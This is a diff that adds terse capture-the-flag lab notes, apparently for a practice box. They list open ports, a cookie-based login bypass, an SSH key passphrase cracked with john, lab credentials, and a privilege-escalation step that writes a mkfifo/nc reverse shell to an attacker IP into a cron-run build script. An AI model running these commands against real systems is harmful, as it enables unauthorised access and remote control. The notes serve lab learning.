@@ -1,0 +1,43 @@
+rockyou
+
+Ninja
+Pars
+Szymex
+Bee
+MuirlandOracle
+
+### PORTS
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+
+found /login
+
+Viewing the source code of the /login page we can identify a vulnerability that will allow us to bypass the login:
+`
+Cookies.set("SessionToken",statusOrCookie)
+window.location = "/admin"
+`
+
+Change the SessionToken
+
+python ../tools/ssh2john id_rsa > id_rsa.hash
+
+john id_rsa.hash
+
+found 
+user=james
+passwd=james13
+
+ssh -i id_rsa james@10.10.138.143
+
+cat /etc/crontab
+
+/etc/hosts
+
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.64.179 1234 >/tmp/f" > downloads/src/buildscript.sh
+
+sudo python3 -m http.server 80
+
+nc -lvnp 1234
+
+
